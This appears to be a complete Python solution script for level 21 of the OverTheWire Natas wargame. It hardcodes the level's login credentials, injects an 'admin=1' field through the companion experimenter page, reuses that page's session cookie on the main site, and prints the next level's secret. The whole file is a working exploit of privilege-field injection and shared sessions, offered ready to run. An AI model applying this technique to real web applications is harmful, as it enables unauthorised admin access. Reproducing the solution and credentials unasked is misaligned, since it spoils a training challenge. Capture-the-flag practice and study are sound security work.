#! /usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = "http://natas21.natas.labs.overthewire.org/index.php"
second_url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=true"
auth = HTTPBasicAuth("natas21","IFekPyrQXftziDEsUr3x21sYuahypdgJ")

data = {"align":"center","fontsize":"100%","bgcolor":"yellow","submit":"Update","admin":"1"}
response = requests.post(second_url,auth=auth,data=data)
session_cookie = response.headers['Set-Cookie'].split(";")[0].split("=")[1]
cookies = {"PHPSESSID":session_cookie}
res = requests.get(url,auth=auth,cookies=cookies)
soup = BeautifulSoup(res.text,"html.parser")
print(str(soup.find("pre")).replace("<pre>","").replace("</pre>",""))


